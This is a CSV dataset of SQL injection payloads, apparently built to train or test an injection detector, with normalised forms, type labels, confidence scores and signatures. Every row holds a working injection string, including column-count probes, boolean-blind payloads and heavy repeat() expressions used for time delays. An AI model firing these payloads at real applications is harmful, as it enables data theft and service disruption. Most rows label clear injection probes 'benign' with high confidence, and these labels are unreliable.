id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
1696,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 130 chars.",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) ) + '",e4a23361,silver
21908,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 125 chars.",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null )",976e07ef,silver
22474,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- rucf",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 133 chars.",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- rucf",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) -- __IDENT__",dc046cb9,silver
21244,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) # huhw",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 87 chars.",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) # huhw",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) # __IDENT__",92a4053f,silver
25779,"1"" ) as aifd where 5962 = 5962",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 30 chars.,1,"1"" ) as aifd where 5962 = 5962",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__",0268b203,silver
23862,"1"" where 9829 = 9829 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 32 chars.,1,"1"" where 9829 = 9829 order by 1#",False,0,"__INT__"" where __INT__ = __INT__ order by __INT__#",04151411,silver
436,1' ) where 6622 = 6622 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 35 chars.,1,1' ) where 6622 = 6622 order by 1--,False,0,__INT__' ) where __INT__ = __INT__ order by __INT__ --,0643cce5,silver
2092,1 ) as drgs where 1989 = 1989 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 42 chars.,1,1 ) as drgs where 1989 = 1989 order by 1--,False,0,__INT__ ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,10eca5f2,silver
23710,1 ) ) as efjb where 4642 = 4642 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 43 chars.,1,1 ) ) as efjb where 4642 = 4642 order by 1#,False,0,__INT__ ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,11fc73bf,silver
19950,1 ) ) as oqui where 3368 = 3368 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 44 chars.,1,1 ) ) as oqui where 3368 = 3368 order by 1--,False,0,__INT__ ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,120eba3b,silver
21879,"-9152"" ) ) as avga where 3825 = 3825 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 48 chars.,1,"-9152"" ) ) as avga where 3825 = 3825 order by 1#",False,0,"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#",13b80705,silver
19450,-7404' where 1536 = 1536 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 36 chars.,1,-7404' where 1536 = 1536 order by 1#,False,0,-__INT__' where __INT__ = __INT__ order by __INT__#,1466b8f0,silver
2159,"-7831"" ) ) as krzi where 3798 = 3798 order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 49 chars.,1,"-7831"" ) ) as krzi where 3798 = 3798 order by 1--",False,0,"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --",1cf425d9,silver
2395,"-1418"" ) where 7528 = 7528 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 38 chars.,1,"-1418"" ) where 7528 = 7528 order by 1#",False,0,"-__INT__"" ) where __INT__ = __INT__ order by __INT__#",1fafd812,silver
18321,"-7416"" where 7656 = 7656 order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 37 chars.,1,"-7416"" where 7656 = 7656 order by 1--",False,0,"-__INT__"" where __INT__ = __INT__ order by __INT__ --",20819f10,silver
2608,"1"" ) ) as irrz where 8730 = 8730 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 44 chars.,1,"1"" ) ) as irrz where 8730 = 8730 order by 1#",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#",31e6022c,silver
23585,-9072 ) as saot where 2278 = 2278 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 45 chars.,1,-9072 ) as saot where 2278 = 2278 order by 1#,False,0,-__INT__ ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,45e6b2d5,silver
22091,1' ) as cdrm where 4595 = 4595 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 42 chars.,1,1' ) as cdrm where 4595 = 4595 order by 1#,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,52e5050d,silver
22067,-8369 ) where 7234 = 7234 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 38 chars.,1,-8369 ) where 7234 = 7234 order by 1--,False,0,-__INT__ ) where __INT__ = __INT__ order by __INT__ --,532e9613,silver
22212,-4595' ) where 4892 = 4892 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 39 chars.,1,-4595' ) where 4892 = 4892 order by 1--,False,0,-__INT__' ) where __INT__ = __INT__ order by __INT__ --,5b902424,silver
2678,"1"" ) where 1300 = 1300 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 34 chars.,1,"1"" ) where 1300 = 1300 order by 1#",False,0,"__INT__"" ) where __INT__ = __INT__ order by __INT__#",5e4959b9,silver
18794,1 ) where 7552 = 7552 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 33 chars.,1,1 ) where 7552 = 7552 order by 1#,False,0,__INT__ ) where __INT__ = __INT__ order by __INT__#,6593429f,silver
18607,1' ) ) as grne where 9003 = 9003 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 45 chars.,1,1' ) ) as grne where 9003 = 9003 order by 1--,False,0,__INT__' ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,6797f0c5,silver
2380,-5432' ) as dndq where 9633 = 9633 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 46 chars.,1,-5432' ) as dndq where 9633 = 9633 order by 1#,False,0,-__INT__' ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,68ab5862,silver
22649,-6566' ) as kggb where 9768 = 9768 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 47 chars.,1,-6566' ) as kggb where 9768 = 9768 order by 1--,False,0,-__INT__' ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,69227874,silver
24372,"-1004"" where 6266 = 6266 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 36 chars.,1,"-1004"" where 6266 = 6266 order by 1#",False,0,"-__INT__"" where __INT__ = __INT__ order by __INT__#",6bcb882e,silver
18796,-2174' ) ) as zhoz where 4185 = 4185 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 48 chars.,1,-2174' ) ) as zhoz where 4185 = 4185 order by 1#,False,0,-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,736a33d2,silver
24834,-4137 ) ) as elxu where 5672 = 5672 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 48 chars.,1,-4137 ) ) as elxu where 5672 = 5672 order by 1--,False,0,-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,74aacbed,silver
19769,"-9054"" ) as rgyu where 3792 = 3792 order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 47 chars.,1,"-9054"" ) as rgyu where 3792 = 3792 order by 1--",False,0,"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --",754c2041,silver
18809,"1"" ) where 5129 = 5129 order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 35 chars.,1,"1"" ) where 5129 = 5129 order by 1--",False,0,"__INT__"" ) where __INT__ = __INT__ order by __INT__ --",770ddcbb,silver
25999,1 where 4985 = 4985 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 31 chars.,1,1 where 4985 = 4985 order by 1#,False,0,__INT__ where __INT__ = __INT__ order by __INT__#,7e9ed9af,silver
565,1' ) ) as pgif where 6346 = 6346,benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 32 chars.,1,1' ) ) as pgif where 6346 = 6346,False,0,__INT__' ) ) as __IDENT__ where __INT__ = __INT__,80b088a4,silver
23827,-9975 where 9760 = 9760 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 36 chars.,1,-9975 where 9760 = 9760 order by 1--,False,0,-__INT__ where __INT__ = __INT__ order by __INT__ --,86fe3e4e,silver
18332,1' ) as lewd where 3118 = 3118 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 43 chars.,1,1' ) as lewd where 3118 = 3118 order by 1--,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,880a7b5b,silver
20066,"1"" ) ) as esho where 8864 = 8864 order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 45 chars.,1,"1"" ) ) as esho where 8864 = 8864 order by 1--",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --",88f110f5,silver
2213,-8523 ) as hzqs where 8944 = 8944 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 46 chars.,1,-8523 ) as hzqs where 8944 = 8944 order by 1--,False,0,-__INT__ ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,91e707e6,silver
22722,-1711 ) where 9098 = 9098 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 37 chars.,1,-1711 ) where 9098 = 9098 order by 1#,False,0,-__INT__ ) where __INT__ = __INT__ order by __INT__#,936e89f8,silver
19277,"1"" where 4298 = 4298 order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 33 chars.,1,"1"" where 4298 = 4298 order by 1--",False,0,"__INT__"" where __INT__ = __INT__ order by __INT__ --",9558e1f2,silver
25350,1' where 8584 = 8584 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 32 chars.,1,1' where 8584 = 8584 order by 1#,False,0,__INT__' where __INT__ = __INT__ order by __INT__#,9639fa6a,silver
21314,-1866' ) ) as cwtv where 3295 = 3295 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 49 chars.,1,-1866' ) ) as cwtv where 3295 = 3295 order by 1--,False,0,-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,9eea30d2,silver
18398,"-3964"" ) where 3566 = 3566 order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 39 chars.,1,"-3964"" ) where 3566 = 3566 order by 1--",False,0,"-__INT__"" ) where __INT__ = __INT__ order by __INT__ --",aa9b9b64,silver
24486,"1"" ) as ucex where 5148 = 5148 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 42 chars.,1,"1"" ) as ucex where 5148 = 5148 order by 1#",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ order by __INT__#",ba9fb785,silver
18803,-5555 ) ) as ldte where 4583 = 4583 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 47 chars.,1,-5555 ) ) as ldte where 4583 = 4583 order by 1#,False,0,-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,bb22af12,silver
23033,-9509' ) where 9303 = 9303 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 38 chars.,1,-9509' ) where 9303 = 9303 order by 1#,False,0,-__INT__' ) where __INT__ = __INT__ order by __INT__#,c07ecff1,silver
18802,1' ) ) as vdhw where 8858 = 8858 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 44 chars.,1,1' ) ) as vdhw where 8858 = 8858 order by 1#,False,0,__INT__' ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,c3b62296,silver
25807,"-7491"" ) as cnrn where 3635 = 3635 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 46 chars.,1,"-7491"" ) as cnrn where 3635 = 3635 order by 1#",False,0,"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ order by __INT__#",cdd025e2,silver
18258,-9826 where 4103 = 4103 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 35 chars.,1,-9826 where 4103 = 4103 order by 1#,False,0,-__INT__ where __INT__ = __INT__ order by __INT__#,d1b2776f,silver
18209,"1"" ) as duvm where 6190 = 6190 order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 43 chars.,1,"1"" ) as duvm where 6190 = 6190 order by 1--",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --",d740e119,silver
25787,-3648' where 4629 = 4629 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 37 chars.,1,-3648' where 4629 = 4629 order by 1--,False,0,-__INT__' where __INT__ = __INT__ order by __INT__ --,e5666a51,silver
19840,1 where 3502 = 3502 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 32 chars.,1,1 where 3502 = 3502 order by 1--,False,0,__INT__ where __INT__ = __INT__ order by __INT__ --,e6b14ee7,silver
24784,1' ) where 3187 = 3187 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 34 chars.,1,1' ) where 3187 = 3187 order by 1#,False,0,__INT__' ) where __INT__ = __INT__ order by __INT__#,e878ba4c,silver
22081,1' where 8635 = 8635 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 33 chars.,1,1' where 8635 = 8635 order by 1--,False,0,__INT__' where __INT__ = __INT__ order by __INT__ --,eb1d9394,silver
22907,1 ) where 1333 = 1333 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 34 chars.,1,1 ) where 1333 = 1333 order by 1--,False,0,__INT__ ) where __INT__ = __INT__ order by __INT__ --,f79b70a2,silver
24468,1 ) as afmb where 8665 = 8665 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 41 chars.,1,1 ) as afmb where 8665 = 8665 order by 1#,False,0,__INT__ ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,fef65cae,silver
285,a' or 1 = 1--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 13 chars.,2,a' or 1 = 1--,False,0,__IDENT__' or __INT__ = __INT__ --,001874d0,silver
458,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'acly' like 'acly",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'acly' like 'acly",False,0,"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0022dbc5,silver
19836,"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dqis"" = ""dqis",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dqis"" = ""dqis",False,0,"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0022dbc5,silver
20770,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'aovy' = 'aovy",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'aovy' = 'aovy",False,0,"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0022dbc5,silver
20801,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'uvlu' = 'uvlu",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'uvlu' = 'uvlu",False,0,"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0022dbc5,silver
23916,"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dbxi"" like ""dbxi",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dbxi"" like ""dbxi",False,0,"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0022dbc5,silver
21684,"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""hmun"" = ""hmun",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""hmun"" = ""hmun",False,0,"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0047ba2b,silver
23799,"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""oxvs"" like ""oxvs",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""oxvs"" like ""oxvs",False,0,"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0047ba2b,silver
